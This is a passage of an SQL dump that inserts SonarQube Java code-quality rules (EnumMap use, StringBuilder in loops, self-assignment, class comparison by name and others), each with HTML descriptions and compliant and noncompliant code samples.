List mockedList = Mockito.mock(List.class);
mockedList.add("one");
mockedList.clear();
// let''s check that "add" and "clear" methods are actually called
Mockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()
</pre>
<h2>Compliant Solution</h2>
<pre>
// Fest
boolean result = performAction();
// let''s now check that result value is true
assertThat(result).isTrue();

// Mockito
List mockedList = Mockito.mock(List.class);
mockedList.add("one");
mockedList.clear();
// let''s check that "add" and "clear" methods are actually called
Mockito.verify(mockedList).add("one");
Mockito.verify(mockedList).clear();
</pre>
<h2>Exceptions</h2>
<p>Variable assignments and return statements are skipped to allow helper methods.</p>
<pre>
private BooleanAssert check(String filename, String key) {
  String fileContent = readFileContent(filename);
  performReplacements(fileContent);
  return assertThat(fileContent.contains(key)); // No issue is raised here
}

@Test
public void test() {
  check("foo.txt", "key1").isTrue();
  check("bar.txt", "key2").isTrue();
}
</pre>', 4, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'tests', false, 'HTML', 1510817812927, 1510817812928, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (894, 'Maps with keys that are enum values should be replaced with EnumMap', 'S1640', NULL, 'squid', '<p>When all the keys of a Map are values from the same enum, the <code>Map</code> can be replaced with an <code>EnumMap</code>, which can be much more
efficient than other sets because the underlying data structure is a simple array.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    Map&lt;COLOR, String&gt; moodMap = new HashMap&lt;COLOR, String&gt; ();
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {

  public enum COLOR {
    RED, GREEN, BLUE, ORANGE;
  }

  public void mapMood() {
    EnumMap&lt;COLOR, String&gt; moodMap = new EnumMap&lt;COLOR, String&gt; (COLOR.class);
  }
}
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'performance', false, 'HTML', 1510817812928, 1510817812929, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (895, 'Inner classes should not have too many lines of code', 'S2972', NULL, 'squid', '<p>Inner classes should be short and sweet, to manage complexity in the overall file. An inner class that has grown longer than a certain threshold
should probably be externalized to its own file.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812930, 1510817812930, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (898, 'Strings should not be concatenated using ''+'' in a loop', 'S1643', NULL, 'squid', '<p>Strings are immutable objects, so concatenation doesn''t simply add the new String to the end of the existing string. Instead, in each loop
iteration, the first String is converted to an intermediate object type, the second string is appended, and then the intermediate object is converted
back to a String. Further, performance of these intermediate operations degrades as the String gets longer. Therefore, the use of StringBuilder is
preferred.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String str = "";
for (int i = 0; i &lt; arrayOfStrings.length ; ++i) {
  str = str + arrayOfStrings[i];
}
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuilder bld = new StringBuilder();
  for (int i = 0; i &lt; arrayOfStrings.length; ++i) {
    bld.append(arrayOfStrings[i]);
  }
  String str = bld.toString();
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'performance', false, 'HTML', 1510817812933, 1510817812934, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (899, 'Identical expressions should not be used on both sides of a binary operator', 'S1764', NULL, 'squid', '<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  doZ();
}
if ( a != a ) { // always false
  doY();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  doX();
}
if ( a == b || a == b ) { // if the first one is true, the second one is too
  doW();
}

int j = 5 / 5; //always 1
int k = 5 - 5; //always 0

c.equals(c); //always true
</pre>
<h2>Exceptions</h2>
<p>The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>
<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.</p>
<pre>
float f;
if(f != f) { //test for NaN value
  System.out.println("f is NaN");
}

int i = 1 &lt;&lt; 1; // Compliant
int j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
  <li> {rule:squid:S1656} - Implements a check on <code>=</code>. </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert', false, 'HTML', 1510817812935, 1510817812935, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (900, 'Escaped Unicode characters should not be used', 'S2973', NULL, 'squid', '<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>
<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a
printable character.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String prefix = "n\u00E9e"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String prefix = "née";
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817812936, 1510817812936, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (904, 'Two branches in a conditional structure should not have exactly the same implementation', 'S1871', NULL, 'squid', '<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1''s implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (i) {
  case 1:
  case 3:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  default:
    doTheRest();
}

if ((a &gt;= 0 &amp;&amp; a &lt; 10) || (a &gt;= 20 &amp;&amp; a &lt; 50)) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else {
  doTheRest();
}
</pre>
<p>or </p>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:
    doFirstThing();
    doThirdThing();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThirdThing();
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'design,suspicious', false, 'HTML', 1510817812940, 1510817812940, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (905, 'Classes should not be compared by name', 'S1872', NULL, 'squid', '<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an object''s type based
on its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted
class and thereby gain trusted access.</p>
<p>Instead, the <code>instanceof</code> operator or the <code>Class.isAssignableFrom()</code> method should be used to check the object''s underlying
type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package computer;
class Pear extends Laptop { ... }

package food;
class Pear extends Fruit { ... }

class Store {

  public boolean hasSellByDate(Object item) {
    if ("Pear".equals(item.getClass().getSimpleName())) {  // Noncompliant
      return true;  // Results in throwing away week-old computers
    }
    return false;
  }

  public boolean isList(Class&lt;T&gt; valueClass) {
    if (List.class.getName().equals(valueClass.getName())) {  // Noncompliant
      return true;
    }
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Store {

  public boolean hasSellByDate(Object item) {
    if (item instanceof food.Pear) {
      return true;
    }
    return false;
  }

  public boolean isList(Class&lt;T&gt; valueClass) {
    if (valueClass.isAssignableFrom(List.class)) {
      return true;
    }
    return false;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/486.html">MITRE, CWE-486</a> - Comparison of Classes by Name </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/LAFlAQ">CERT, OBJ09-J.</a> - Compare classes and not class names </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812941, 1510817812941, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (909, 'Java 8''s "Files.exists" should not be used', 'S3725', NULL, 'squid', '<p>The <code>Files.exists</code> method has noticeably poor performance in JDK 8, and can slow an application significantly when used to check files
that don''t actually exist. </p>
<p>The same goes for <code>Files.notExists</code>, <code>Files.isDirectory</code> and <code>Files.isRegularFile</code>.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is not 8.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Path myPath;
if(java.nio.Files.exists(myPath)) {  // Noncompliant
 // do something
}
</pre>
<h2>Compliant Solution</h2>
<pre>
Path myPath;
if(myPath.toFile().exists())) {
 // do something
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://bugs.openjdk.java.net/browse/JDK-8153414">https://bugs.openjdk.java.net/browse/JDK-8153414</a> </li>
  <li> <a href="https://bugs.openjdk.java.net/browse/JDK-8153414">https://bugs.openjdk.java.net/browse/JDK-8154077</a> </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'java8,performance', false, 'HTML', 1510817812945, 1510817812946, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (906, 'Jump statements should not be used unconditionally', 'S1751', NULL, 'squid', '<p>Having an unconditional <code>break</code>, <code>return</code> or <code>throw</code> in a loop renders it useless; the loop will only execute once
and the loop structure itself is simply wasted keystrokes.</p>
<p>Having an unconditional <code>continue</code> in a loop is itself wasted keystrokes.</p>
<p>For these reasons, unconditional jump statements should never be used except for the final <code>return</code> in a function or method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i;
for (i = 0; i &lt; 10; ++i) {
  System.out.println("i is " + i);
  break;  // loop only executes once
}

for (i = 0; i &lt; 10; ++i) {
  System.out.println("i is " + i);
  continue;  // this is meaningless; the loop would continue anyway
}

for (i = 0; i &lt; 10; ++i) {
  System.out.println("i is " + i);
  return;  // loop only executes once
}
</pre>
<h2>Compliant Solution</h2>
<pre>
int i;
for (i = 0; i &lt; 10; ++i) {
  System.out.println("i is " + i);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.1 - There shall be no unreachable code. </li>
  <li> MISRA C++:2008, 0-1-1 - A <em>project</em> shall not contain <em>unreachable code</em>. </li>
  <li> MISRA C++:2008, 0-1-9 - There shall be no dead code. </li>
  <li> MISRA C:2012, 2.2 - There shall be no dead code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'cert,misra,unused', false, 'HTML', 1510817812942, 1510817812943, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (907, '"for" loop increment clauses should modify the loops'' counters', 'S1994', NULL, 'squid', '<p>It can be extremely confusing when a <code>for</code> loop''s counter is incremented outside of its increment clause. In such cases, the increment
should be moved to the loop''s increment clause if at all possible.</p>
<h2>Noncompliant Code Example</h2>
<pre>
for (i = 0; i &lt; 10; j++) {  // Noncompliant
  // ...
  i++;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (i = 0; i &lt; 10; i++, j++) {
  // ...
}
</pre>
<p>Or</p>
<pre>
for (i = 0; i &lt; 10; i++) {
  // ...
  j++;
}
</pre>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'confusing', false, 'HTML', 1510817812943, 1510817812944, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (908, '"@NonNull" values should not be set to null', 'S2637', NULL, 'squid', '<p>Fields, parameters and return values marked <code>@NotNull</code>, <code>@NonNull</code>, or <code>@Nonnull</code> are assumed to have non-null
values and are not typically null-checked before use. Therefore setting one of these values to <code>null</code>, or failing to set such a class field
in a constructor, could cause <code>NullPointerException</code>s at runtime.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MainClass {

  @Nonnull
  private String primary;
  private String secondary;

  public MainClass(String color) {
    if (color != null) {
      secondary = null;
    }
    primary = color;  // Noncompliant; "primary" is Nonnull but could be set to null here
  }

  public MainClass() { // Noncompliant; "primary" Nonnull" but is not initialized
  }

  @Nonnull
  public String indirectMix() {
    String mix = null;
    return mix;  // Noncompliant; return value is Nonnull, but null is returned.}}
  }
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe', false, 'HTML', 1510817812944, 1510817812945, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (910, '"=+" should not be used instead of "+="', 'S2757', NULL, 'squid', '<p>The use of operators pairs ( <code>=+</code>, <code>=-</code> or <code>=!</code> ) where the reversed, single operator was meant (<code>+=</code>,
<code>-=</code> or <code>!=</code>) will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code>, <code>=-</code>, or <code>=!</code> is used without any spacing between the two operators and when
there is at least one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int target = -5;
int num = 3;

target =- num;  // Noncompliant; target = -3. Is that really what''s meant?
target =+ num; // Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
int target = -5;
int num = 3;

target = -num;  // Compliant; intent to assign inverse value of num is clear
target += num;
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817812946, 1510817812947, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (911, 'Inappropriate regular expressions should not be used', 'S2639', NULL, 'squid', '<p>Regular expressions are powerful but tricky, and even those long used to using them can make mistakes.</p>
<p>The following should not be used as regular expressions:</p>
<ul>
  <li> <code>.</code> - matches any single character. Used in <code>replaceAll</code>, it matches <em>everything</em> </li>
  <li> <code>|</code> - normally used as an option delimiter. Used stand-alone, it matches the space between characters </li>
  <li> <code>File.separator</code> - matches the platform-specific file path delimiter. On Windows, this will be taken as an escape character </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
String str = "/File|Name.txt";

String clean = str.replaceAll(".",""); // Noncompliant; probably meant to remove only dot chars, but returns an empty string
String clean2 = str.replaceAll("|","_"); // Noncompliant; yields _/_F_i_l_e_|_N_a_m_e_._t_x_t_
String clean3 = str.replaceAll(File.separator,""); // Noncompliant; exception on Windows
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812948, 1510817812948, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (912, 'Method overrides should not change contracts', 'S2638', NULL, 'squid', '<p>Because a subclass instance may be cast to and treated as an instance of the superclass, overriding methods should uphold the aspects of the
superclass contract that relate to the Liskov Substitution Principle. Specifically, if the parameters or return type of the superclass method are
marked with any of the following: <code>@Nullable</code>, <code>@CheckForNull</code>, <code>@NotNull</code>, <code>@NonNull</code>, and
<code>@Nonnull</code>, then subclass parameters are not allowed to tighten the contract, and return values are not allowed to loosen it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {

  private Season ripe;
  private String color;

  public void setRipe(@Nullable Season ripe) {
    this.ripe = ripe;
  }

  public @NotNull Integer getProtein() {
    return 12;
  }
}

public class Raspberry extends Fruit {

  public void setRipe(@NotNull Season ripe) {  // Noncompliant
    this.ripe = ripe;
  }

  public @Nullable Integer getProtein() {  // Noncompliant
    return null;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> https://en.wikipedia.org/wiki/Liskov_substitution_principle </li>
</ul>', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812949, 1510817812949, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (913, 'Track uses of "@SuppressWarnings" annotations', 'S1309', NULL, 'squid', '<p>This rule allows you to track the usage of the <code>@SuppressWarnings</code> mechanism.</p>
<h2>Noncompliant Code Example</h2>
<p>With a parameter value of "unused" :</p>
<pre>
@SuppressWarnings("unused")
@SuppressWarnings("unchecked")  // Noncompliant
</pre>', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812950, 1510817812950, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (914, '"switch" statements should have at least 3 "case" clauses', 'S1301', NULL, 'squid', '<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (variable) {
  case 0:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (variable == 0) {
  doSomething();
} else {
  doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'bad-practice,misra', false, 'HTML', 1510817812951, 1510817812951, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (915, 'Variables should not be self-assigned', 'S1656', NULL, 'squid', '<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void setName(String name) {
  name = name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void setName(String name) {
  this.name = name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP.</a> - Detect and remove code that has no effect </li>
</ul>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3min', NULL, NULL, 'cert', false, 'HTML', 1510817812952, 1510817812953, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (916, 'Java parser failure', 'ParsingError', 'S2260', 'squid', '<p>When the Java parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number
of files that do not parse but also to easily find out why they do not parse.</p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812953, 1510817812954, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (917, 'Multiple variables should not be declared on the same line', 'S1659', NULL, 'squid', '<p>Declaring multiple variable on one line is difficult to read.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class MyClass {

  private int a, b;

  public void method(){
    int c; int d;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {

  private int a;
  private int b;

  public void method(){
    int c;
    int d;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 8-0-1 - An init-declarator-list or a member-declarator-list shall consist of a single init-declarator or member-declarator
  respectively </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/7wHEAw">CERT, DCL52-J.</a> - Do not declare more than one variable per declaration
  </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VgU">CERT, DCL04-C.</a> - Do not declare more than one variable per declaration </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/fAAhAQ">CERT, DCL04-CPP.</a> - Do not declare more than one variable per declaration
  </li>
</ul>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'cert,convention,misra', false, 'HTML', 1510817812954, 1510817812955, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (918, 'Consumed Stream pipelines should not be reused', 'S3959', NULL, 'squid', '<p>Stream operations are divided into intermediate and terminal operations, and are combined to form stream pipelines. After the terminal operation is
performed, the stream pipeline is considered consumed, and cannot be used again. Such a reuse will yield unexpected results.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream&lt;Widget&gt; pipeline = widgets.stream().filter(b -&gt; b.getColor() == RED);
int sum1 = pipeline.sum();
int sum2 = pipeline.mapToInt(b -&gt; b.getWeight()).sum(); // Noncompliant
</pre>
<h2>See</h2>
<p><a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html#StreamOps">Stream Operations</a></p>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'java8', false, 'HTML', 1510817812955, 1510817812956, 2);
